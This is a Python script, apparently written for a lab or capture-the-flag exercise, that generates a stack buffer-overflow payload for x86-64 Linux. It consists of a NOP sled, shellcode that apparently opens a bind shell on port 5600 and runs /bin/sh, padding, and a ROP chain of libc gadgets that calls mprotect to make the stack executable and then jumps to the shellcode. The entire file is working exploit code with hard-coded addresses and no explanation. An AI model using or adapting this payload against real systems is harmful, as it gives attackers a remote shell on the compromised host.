import sys
from struct import pack

stck = lambda x : pack('<Q', x)

libc_base_address = 0x7ffff7dcd000

nop_sled = b'\x90' * 80

shellcode=  b"\x48\x31\xc0\x48\x31\xf6\x99\x6a\x29\x58\xff"
shellcode+= b"\xc6\x6a\x02\x5f\x0f\x05\x48\x97\x6a\x02\x66"
shellcode+= b"\xc7\x44\x24\x02\x15\xe0\x54\x5e\x52\x6a\x10"
shellcode+= b"\x5a\x6a\x31\x58\x0f\x05\x50\x5e\x6a\x32\x58"
shellcode+= b"\x0f\x05\x6a\x2b\x58\x0f\x05\x48\x97\x6a\x03"
shellcode+= b"\x5e\xff\xce\xb0\x21\x0f\x05\x75\xf8\x48\x31"
shellcode+= b"\xc0\x99\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73"
shellcode+= b"\x68\x53\x54\x5f\x6a\x3b\x58\x0f\x05"

padding = b'\x41'* (208 - len(nop_sled) - len(shellcode))
padding+= b'\x42' * 8

dummy = 0x00414141414141

mprotect = 0x7ffff7ee59d0

address_to_rwx = 0x00007ffffffde000

shellcode_address = 0x7fffffffdd30

pop_rdi = libc_base_address + 0x23b72
pop_rsi = libc_base_address + 0x2604f
pop_rdx = libc_base_address + 0x119241

exploit  = nop_sled + shellcode + padding
exploit += stck(pop_rdi)
exploit += stck(address_to_rwx)
exploit += stck(pop_rsi)
exploit += stck(0x21000)
exploit += stck(pop_rdx)
exploit += stck(0x7)
exploit += stck(dummy)
exploit += stck(mprotect)
exploit += stck(shellcode_address)

sys.stdout.buffer.write(exploit)